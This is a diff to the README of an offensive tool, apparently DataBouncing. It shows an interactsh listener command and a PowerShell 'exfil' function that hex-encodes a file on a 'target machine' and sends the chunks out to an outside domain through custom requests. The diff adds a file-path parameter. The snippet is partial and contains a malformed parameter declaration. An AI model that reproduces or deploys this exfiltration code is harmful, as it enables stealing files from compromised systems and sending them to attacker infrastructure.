@@ -13,15 +13,18 @@ interactsh-client -v -o /root/DataBouncing/logs.txt
 Next on the target machine you are going to want to convert a file to Hex and prepare it for transfer with this script:
 [chunks](https://github.com/Unit-259/DataBouncing/blob/main/Client/Convert-FileToHexChunks.ps1)
 
+
+
 ```powershell
 
 function exfil {
     param (
-        [string]xregex,
+        [string]regex,
         [string]$domain,
-        [string]$url
+        [string]$url,
+        [string]$filepath
     )
-    $segments = Convert-FileToHexChunks -FilePath .\file.txt
+    $segments = Convert-FileToHexChunks -FilePath $filepath
     foreach ($segment in $segments.PSObject.Properties) {
         $secret = $segment.Value;
         send-customRequest -Url "$regex.$url" -Domain "$domain"    
